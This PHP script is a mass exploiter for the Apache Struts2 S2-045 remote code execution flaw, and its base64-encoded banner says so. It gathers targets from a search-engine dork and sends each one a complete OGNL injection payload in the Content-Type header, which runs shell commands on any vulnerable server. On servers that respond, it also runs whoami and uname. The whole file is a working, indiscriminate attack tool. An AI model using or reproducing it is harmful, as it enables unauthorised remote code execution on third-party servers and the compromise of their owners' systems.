<?php

define('separator', str_repeat('-', 100) . "\n");
$showAll = true;

echo separator . base64_decode('ICAgICAgICAgICAgICAgICAgTWFzcyBBcGFjaGUgU3RydXRzMiBTMi0wNDUgKENWRS0yMDE3LTU2MzgpIEV4cGxvaXRlciBieSBBbm9uR3V5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcmVldHMgfiBUM04zOFIxNSAtIE1ha01hbiAtIE1haW5pIC0gTW9oaXQK') . separator;

$dork = 'site:*.tld filetype:action';
$mak  = (!file_exists('temp.txt')) ? `python3 makman.py '$dork' 20 8 > temp.txt` : '';

if (file_exists('temp.txt')) {
    file_put_contents('temp.txt', array_reduce(file('temp.txt'), function(array $list, $url) {
        $domain = parse_url($url, PHP_URL_HOST);
        if (!isset($list[$domain])) {
            $list[$domain] = $url;
        }
        return $list;
    }, []));
} else {
    die('Error! -- File "temp.txt" not found!');
}


function exploit($url, $cmd) {
    $contentType = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='$cmd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
	return @file_get_contents(urldecode($url), false, stream_context_create(['http' => ['method'  => 'GET', 'header'  => 'Content-type: ' . $contentType]]));
}


foreach (file('temp.txt') as $domain) {
    $domain = trim($domain);
    if (filter_var($domain, FILTER_VALIDATE_URL) !== false) {
        $test = exploit($domain, 'echo Khan');
        if (strpos($test, 'Khan') !== false && strpos($test, 'the request doesn\'t contain a multipart/form-data') === false && strpos($test, '<') === false) {
            echo '[+] domain ~ ' . $domain . "\n";
            echo '[+] whoami ~ ' . exploit($domain, 'whoami');
            echo '[+] uname  ~ ' . exploit($domain, 'uname -snv');
            echo separator;
        } else {
            if($showAll){
                echo '[+] domain ~ ' . $domain . "\n";
                echo '[+] not vulnerable' . "\n";
                echo separator;
            }
        }
    }
}

//unlink('temp.txt');

?>